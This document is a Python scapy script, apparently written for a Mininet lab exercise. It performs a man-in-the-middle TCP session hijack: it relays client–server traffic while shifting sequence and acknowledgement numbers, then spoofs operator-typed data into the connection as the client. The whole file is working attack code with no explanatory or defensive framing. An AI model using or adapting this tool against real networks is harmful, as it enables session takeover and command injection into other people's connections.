#!/usr/bin/python3

import sys
import getopt
import threading
from scapy.all import *

dev = "h3-eth0"
srv_port = None
srv_ip = None
client_port = None
client_ip = None

cli_offset = 0          # 공격자가 server에 inject한 누적 바이트
next_cli_seq = None     # client view 의 다음 seq
next_srv_seq = None     # server view 의 다음 seq
hijacked = False


def input_loop():
    global cli_offset
    while True:
        inject_data = input(">> ")
        inject_data = inject_data + "\n"

        if not hijacked:
            continue

        # Spoof packet from client (with offset)
        seq = (next_cli_seq + cli_offset) & 0xFFFFFFFF
        packet = IP(src=client_ip, dst=srv_ip) \
                 / TCP(sport=client_port, dport=srv_port, seq=seq, ack=next_srv_seq,
                       flags="PA") \
                 / inject_data
        send(packet, iface=dev, verbose=False)
        cli_offset += len(inject_data)


def handle_packet(packet):
    global hijacked, next_cli_seq, next_srv_seq, client_port
    ip = packet.getlayer("IP")
    tcp = packet.getlayer("TCP")
    flags = tcp.sprintf("%flags%")

    print("Got packet %s:%d -> %s:%d [%s]" % (ip.src, tcp.sport, ip.dst, tcp.dport, flags))

    payload_len = len(packet.getlayer("Raw").load) if packet.haslayer("Raw") else 0
    seg_len = payload_len + (1 if (tcp.flags & 0x01) else 0) + (1 if (tcp.flags & 0x02) else 0)

    # client -> server : relay with seq offset
    if ip.src == client_ip and ip.dst == srv_ip:
        if client_port is None:
            client_port = tcp.sport

        new_seq = (tcp.seq + cli_offset) & 0xFFFFFFFF
        fwd = IP(src=ip.src, dst=ip.dst) \
              / TCP(sport=tcp.sport, dport=tcp.dport, seq=new_seq, ack=tcp.ack,
                    flags=tcp.flags, window=tcp.window)
        if payload_len > 0:
            fwd = fwd / Raw(load=packet.getlayer("Raw").load)
        send(fwd, iface=dev, verbose=False)

        next_cli_seq = (tcp.seq + seg_len) & 0xFFFFFFFF

    # server -> client : relay with ack offset
    elif ip.src == srv_ip and ip.dst == client_ip:
        new_ack = (tcp.ack - cli_offset) & 0xFFFFFFFF
        fwd = IP(src=ip.src, dst=ip.dst) \
              / TCP(sport=tcp.sport, dport=tcp.dport, seq=tcp.seq, ack=new_ack,
                    flags=tcp.flags, window=tcp.window)
        if payload_len > 0:
            fwd = fwd / Raw(load=packet.getlayer("Raw").load)
            print("[server] " + packet.getlayer("Raw").load.decode(errors='replace'), end='')
        send(fwd, iface=dev, verbose=False)

        next_srv_seq = (tcp.seq + seg_len) & 0xFFFFFFFF

        if not hijacked and next_cli_seq is not None and client_port is not None:
            hijacked = True
            print("Start injecting (MITM mode)")
            threading.Thread(target=input_loop, daemon=True).start()


def usage():
    print(sys.argv[0])
    print("""
    -c <client_ip>
    -s <srv_ip>
    -p <srv_port>
    """)
    sys.exit(1)


try:
    cmd_opts = "c:s:p:"
    opts, args = getopt.getopt(sys.argv[1:], cmd_opts)
except getopt.GetoptError:
    usage()

for opt in opts:
    if opt[0] == "-c":
        client_ip = opt[1]
    elif opt[0] == "-s":
        srv_ip = opt[1]
    elif opt[0] == "-p":
        srv_port = int(opt[1])
    else:
        usage()

if not srv_ip or not srv_port or not client_ip:
    usage()

print("MITM between %s and %s:%d" % (client_ip, srv_ip, srv_port))
filter = "tcp and port " + str(srv_port) + " and host " + srv_ip + " and host " + client_ip

sniff(iface=dev, store=0, filter=filter, prn=handle_packet)
